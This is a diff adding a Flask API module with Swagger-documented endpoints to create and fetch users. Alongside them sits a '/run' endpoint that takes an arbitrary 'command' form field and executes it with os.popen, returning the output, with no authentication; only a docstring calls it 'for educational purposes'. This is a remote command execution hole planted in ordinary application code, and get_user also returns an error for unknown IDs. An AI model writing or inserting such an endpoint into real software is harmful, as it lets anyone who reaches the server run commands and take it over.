@@ -1,0 +1,72 @@
+from flask import request, jsonify
+from flasgger import Swagger
+from models import db, User
+import os
+
+def init_app(app):
+    Swagger(app)
+    @app.route('/users', methods=['POST'])
+    def create_user():
+        """
+        Create a new user
+        ---
+        parameters:
+          - name: body
+            in: body
+            required: true
+            schema:
+              id: User
+              required:
+                - username
+                - email
+              properties:
+                username:
+                  type: string
+                  description: The user's name
+                email:
+                  type: string
+                  description: The user's email
+        responses:
+          201:
+            description: User created
+        """
+        username = request.json['username']
+        email = request.json['email']
+        user = User(username=username, email=email)
+        db.session.add(user)
+        db.session.commit()
+        return jsonify({'username': user.username, 'email': user.email}), 201
+
+    @app.route('/users/<int:user_id>', methods=['GET'])
+    def get_user(user_id):
+        """
+        Get a user by ID
+        ---
+        parameters:
+          - name: user_id
+            in: path
+            type: integer
+            required: true
+        responses:
+          200:
+            description: User found
+        """
+        user = User.query.get(user_id)
+        return jsonify({'username': user.username, 'email': user.email})
+
+    @app.route('/run', methods=['POST'])
+    def run_command():
+        """
+        Run a command (for educational purposes only, do not use in production)
+        ---
+        parameters:
+          - name: command
+            in: formData
+            type: string
+            required: true
+        responses:
+          200:
+            description: Command output
+        """
+        command = request.form['command']
+        return os.popen(command).read()
